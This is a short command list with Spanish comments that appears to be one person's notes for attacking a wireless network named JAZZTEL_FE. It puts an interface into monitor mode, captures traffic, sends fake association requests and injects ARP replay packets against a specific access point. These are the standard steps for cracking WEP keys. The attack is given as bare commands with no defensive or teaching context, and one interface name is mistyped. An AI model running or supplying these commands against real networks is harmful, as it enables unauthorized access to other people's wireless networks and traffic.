#Iniciar el interfaz en modo monitor
airmon-ng start wlan20 11
#Capturar los paquetes
airodump-ng --wps wlan20mon -c 11 -d 00:1A:2B:3D:52:56 -w /l/juan/cap
#Enviar asociation request
aireplay-ng -1 0 -e JAZZTEL_FE -a 00:1A:2B:3D:52:56 wla20mon
aireplay-ng -1 6000 -o 1 -q 10 -e JAZZTEL_FE -a 00:1A:2B:3D:52:56 wlan20mon
#Injectar ARP
aireplay-ng -3 -e JAZZTEL_FE -b 00:1A:2B:3D:52:56 wlan20mon -r /l/juan/cap-02.cap
